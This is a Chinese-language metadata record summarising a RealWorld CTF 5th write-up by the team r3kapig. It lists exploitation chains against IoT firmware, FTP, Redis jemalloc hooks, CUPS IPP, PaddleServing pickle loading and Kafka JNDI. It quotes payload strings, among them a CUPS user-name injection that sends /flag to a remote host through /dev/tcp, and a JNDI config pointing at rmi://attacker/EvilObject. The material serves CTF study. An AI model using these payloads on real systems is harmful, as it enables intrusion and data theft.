...
quality: high
full_path: RealWorld_CTF_5th_Writeup_by_r3kapig.full.md
meta_path: RealWorld_CTF_5th_Writeup_by_r3kapig.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: RealWorld CTF 5th Writeup by r3kapig。RealWorld CTF 5th r3kapig 多方向 WP：IoT mips UDP 栈溢出 + FTP PASV 注入 + Redis Jemalloc extent_hooks 任意执行 + CUPS IPP 协议 RCE + 自定义 VM 浮点 + PaddleServing pickle + Java X...
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/130660.html
wp_author: r3kapig
reasoning_chain:
- r3kapig 多方向 WP → 触发点：IoT mips UDP + FTP + Redis + CUPS + VM + PaddleServing
- IoT 跟 RWCTF 5th ShellFind 同源 (ipfind UDP 62720 base64 栈溢出) → MIPS shellcraft.open('/firmadyne/flag')+read+sendto
- FTP PASV 拿 data port + USER/PASS anonymous + LIST/RETR → user 命令注入触发 ftp 用户名解析
- Redis Jemalloc Hook：debug mallctl arena.0.extent_hooks 写 fake extent_hooks
- extent_hooks libssl_base+0x2f3f4 触发 mov rdi,[rdi]; jmp [rdi+0x30] → cmd_addr+0x13 触发
- CUPS IPP 协议 requesting-user-name 注入 ' ;bash -c 'cat /flag >&/dev/tcp/ip/port'; ' → snprintf + system(cmdline)
- 自定义 VM 浮点：add esp 0x401de60 + pop eax + prn eax → sub eax 0x12e0bd + 0x10 找 base
- PaddleServing：np.load(byte_data, allow_pickle=True) 反序列化 → POST /uci/prediction byte_data=pickle.dumps(RCE())
- Kafka SASL JNDI：sasl.jaas.config=com.sun.security.auth.module.JndiLoginModule rmi://attacker/EvilObject
failed_attempts:
- 试图 glibc tcache_perthread_struct 攻击 Redis → 失败：Redis 用 Jemalloc
- 试图走默认 HTTP 80 → 失败：CUPS IPP 才是入口
- 试图用 LDAP 反序列化 → 失败：必须走 Kafka SASL
key_observations:
- Redis Jemalloc extent_hooks 是 2022 后 Redis 任意执行新攻击面
- CUPS IPP 协议 user-name 注入是 Linux 桌面 RCE 入口
- PaddleServing np.load pickle 是 AI 服务常见漏洞
- Kafka SASL JAAS 配置 JNDI 注入是 Java 服务 RCE
- XInclude <xop:Include href='file:////opt/tomcat/webapps/ROOT.war'/> 是 Java 反序列化
prerequisites:
- Redis Jemalloc extent_hooks 攻击
- CUPS IPP 协议 + requesting-user-name
- PaddleServing np.load pickle 反序列化
- Kafka SASL JAAS JNDI 注入
---
